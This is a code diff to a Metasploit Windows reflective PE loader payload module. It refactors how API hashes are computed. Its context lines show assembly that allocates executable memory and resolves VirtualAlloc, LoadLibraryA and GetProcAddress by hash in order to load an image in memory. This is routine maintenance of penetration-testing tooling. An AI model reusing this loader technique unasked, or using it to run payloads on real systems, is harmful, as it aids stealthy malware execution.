@@ -4,7 +4,6 @@ module Msf
   module Payload::Windows::ReflectivePELoader
     include Payload::Windows::BlockApi
     def asm_reflective_pe_loader(opts)
-
       prologue = ''
       if opts[:is_dll] == true
         prologue = %(
@@ -33,7 +32,7 @@ start:                    ;
   push 0x103000           ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
   push dword [esp+12]     ; dwSize
   push 0x00               ; lpAddress
-  push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+  push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
   call ebp                ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   push eax                ; Save the new image base to stack
   xor edx,edx             ; Zero out the edx
@@ -129,7 +128,7 @@ LoadLibraryA:
   push ecx                ; Save ecx to stack
   push edx                ; Save edx to stack
   push eax                ; Push the address of linrary name string
-  push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}         ; ror13( "kernel32.dll", "LoadLibraryA" )
+  push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}         ; ror13( "kernel32.dll", "LoadLibraryA" )
   call ebp                ; LoadLibraryA([esp+4])
   pop edx                 ; Retrieve edx
   pop ecx                 ; Retrieve ecx
@@ -139,7 +138,7 @@ GetProcAddress:
   push edx                ; Save edx to stack
   push eax                ; Push the address of proc name string
   push ebx                ; Push the dll handle
-  push #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}         ; ror13( "kernel32.dll", "GetProcAddress" )
+  push #{block_api_hash('kernel32.dll', 'GetProcAddress')}         ; ror13( "kernel32.dll", "GetProcAddress" )
   call ebp                ; GetProcAddress(ebx,[esp+4])
   pop edx                 ; Retrieve edx
   pop ecx                 ; Retrieve ecx
